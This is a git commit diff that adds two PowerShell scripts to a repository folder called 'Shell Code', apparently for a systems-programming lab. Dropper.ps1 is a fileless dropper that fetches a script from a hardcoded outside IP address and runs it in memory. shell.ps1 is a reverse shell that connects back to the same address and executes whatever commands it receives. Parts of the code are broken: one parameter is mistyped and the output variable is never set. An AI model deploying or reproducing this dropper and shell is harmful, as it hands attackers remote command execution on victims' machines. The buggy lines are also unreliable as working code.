d8d7e71c26f82e8e243f469bf4a316ca41bd7834
Thabiso Mashifana <104872837+ThabisoM7@users.noreply.github.com>
2025-08-20 23:30:50 +0200

    Add files via upload

---
+++ Systems-Programming-Lab-main/Shell Code/Dropper.ps1
@@ -0,0 +1,10 @@
+﻿# Fileless Powershell Dropper - Memory Execution of Payload
+
+$remotePayload = "http://146.190.226.7/shell.ps1"
+
+try{
+$code = Invoke-WebRequest -Uri $remotePayload =UseBasicParsing
+IEX $code.Content
+} catch {
+    Write-Error "Failed to retrieve  or execute payload"
+}
---
+++ Systems-Programming-Lab-main/Shell Code/shell.ps1
@@ -0,0 +1,11 @@
+﻿$client = New-Object System.Net.Sockets.TCPCLIENT("146.190.226.7", 80);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
+$sendback = (iex $data 2>&1 | Out-String );
+$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+$sendbyte.Write($sendbyte, 0, $sendbyte.Length);
+$stream.Flush();
+}
+$client.Flush();
